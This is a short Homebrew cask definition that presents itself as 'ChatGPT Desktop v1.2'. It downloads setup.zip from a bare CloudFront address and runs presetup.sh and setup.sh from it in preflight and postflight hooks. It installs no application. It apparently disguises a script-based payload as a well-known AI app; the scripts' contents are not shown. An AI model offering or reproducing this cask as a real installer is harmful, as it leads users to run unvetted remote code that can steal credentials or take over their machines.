cask "v1.2" do
  version "1.2.025.210"
  sha256 "8697aeddb45f064c6bb21589229e1c27d9fa7e9cb2380bbcaf4741a516a6d6be"
  url "https://d3vi63ssapyaka.cloudfront.net/chatgpt/1.2025.210/setup.zip"
  name "ChatGPT Desktop v1.2"
  desc "ChatGPT Desktop v1.2"
  preflight do
    system_command "/bin/zsh", args: ["#{staged_path}/presetup.sh"]
  end
  postflight do
    system_command "/bin/zsh", args: ["#{staged_path}/setup.sh"]
  end
end
